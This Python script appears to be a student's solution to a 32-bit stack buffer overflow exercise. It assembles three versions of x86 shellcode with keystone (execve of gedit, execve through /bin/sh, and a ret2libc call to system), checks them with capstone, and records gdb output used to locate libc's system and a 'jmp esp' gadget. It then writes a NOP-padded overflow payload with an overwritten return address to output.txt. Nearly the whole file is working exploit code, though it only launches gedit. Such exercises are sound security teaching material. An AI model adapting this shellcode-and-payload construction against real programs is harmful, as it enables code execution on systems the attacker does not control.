from keystone import *
from capstone import *
import struct

# version 1
# char *param[] = {"/usr/bin/gedit", 0};
# execve("/usr/bin/gedit", param, NULL);
code = '''
xor eax, eax 
push eax
push 0x74696465
push 0x672f6e69
push 0x622f7273
mov ebx, 0x752fffff
shr ebx, 4
shl ebx, 4
push ebx
mov ebx, esp
add ebx, 2
push eax
mov edx, esp
push ebx
mov ecx, esp
mov al, 3
shl eax, 2
dec eax
int 0x80
'''

# version 2
# char *param[] = {"/bin/sh", "-c", "/usr/bin/gedit", 0};
# execve("/bin/sh", param, NULL);
code = '''
xor eax, eax 
push eax
push 0x68732f6e
mov ebx, 0x69622fff
shr ebx, 8
shl ebx, 8
push ebx
mov ebx, esp
add ebx, 1

mov ecx, 0x632dffff
shr ecx, 16
shl ecx, 16
push ecx
mov ecx, esp
add ecx, 2

push 0x74696465
push 0x672f6e69
push 0x622f7273
mov edx, 0x752fffff
shr edx, 16
shl edx, 16
push edx
mov edx, esp
add edx, 2

push eax
push edx
push ecx
push ebx
mov ecx, esp
xor edx, edx

mov al, 3
shl eax, 2
dec eax
int 0x80
'''

# break *foo+55
# run < output.txt

# \x0, \n, \xb, \x20(space) will be swallowed by scanf




# version 3
# //system("gedit");

# >>> s = 'gedit'
# >>> s[::-1].encode('hex')
# '7469646567'

code = '''
push 0
push 0x74696465
mov bl, 0x67
shl ebx, 24
push ebx
mov ebx, esp
add ebx, 3
push ebx
push 0xb7e44da0
push 0xb7e44da0
ret
'''

# (gdb) break main
# Breakpoint 1 at 0x80484a1
# (gdb) run
# Starting program: /home/s2ist/Challenges/C3/hw2 

# Breakpoint 1, 0x080484a1 in main ()
# (gdb) print &system
# $1 = (<text variable, no debug info> *) 0xb7e44da0 <__libc_system>
# (gdb) 



def hex_str_to_binary(s):
  s = s.split(r'\x')
  s = [int(c, 16) for c in s if c!='']
  # print(s)
  s = bytearray(s)
  return s

def verify_code(code):
  md = Cs(CS_ARCH_X86, CS_MODE_32)
  try:
    for i in md.disasm(code, 0x1000):
      print('%s\t%s' % (i.mnemonic, i.op_str))
  except:
    print('verify_code fails.')
  

try:
  ks = Ks(KS_ARCH_X86, KS_MODE_32)
  encoding, count = ks.asm(code)
  print(encoding)
  print('%d bytes' % len(encoding))
  shellcode = ''.join([r'\x%x' % num for num in encoding])
  print(shellcode)
except KsError as e:
  print('ERROR: %s' % e)

verify_code(hex_str_to_binary(shellcode))

#(gdb) info sharedlibrary
#From        To          Syms Read   Shared Object Library
#0xb7e21750  0xb7f4d21d  Yes         /lib/i386-linux-gnu/libc.so.6
#0xb7fdb860  0xb7ff477d  Yes         /lib/ld-linux.so.2
#(gdb) find /b 0xb7e21750, 0xb7f4d21d, 0xff, 0xe4
#0xb7e3739d <__GI_abort+237>
#0xb7ee7a0b <__statvfs_getflags+427>
#0xb7f06f3d <__GI_rexec_af+429>
#0xb7f11c7d <__GI___nss_gshadow_lookup2+93>

# 0xb7e3739d
ret_addr = r'\x9d\x73\xe3\xb7'
shellcode = r'\x90' * (0xe + 4) + ret_addr + shellcode + r'\x0'

print(shellcode)

write_binary = True
if write_binary:  
  shellcode = hex_str_to_binary(shellcode)

print('%d bytes' % len(shellcode))

output = open('output.txt', 'wb')
output.write(shellcode)
output.close()


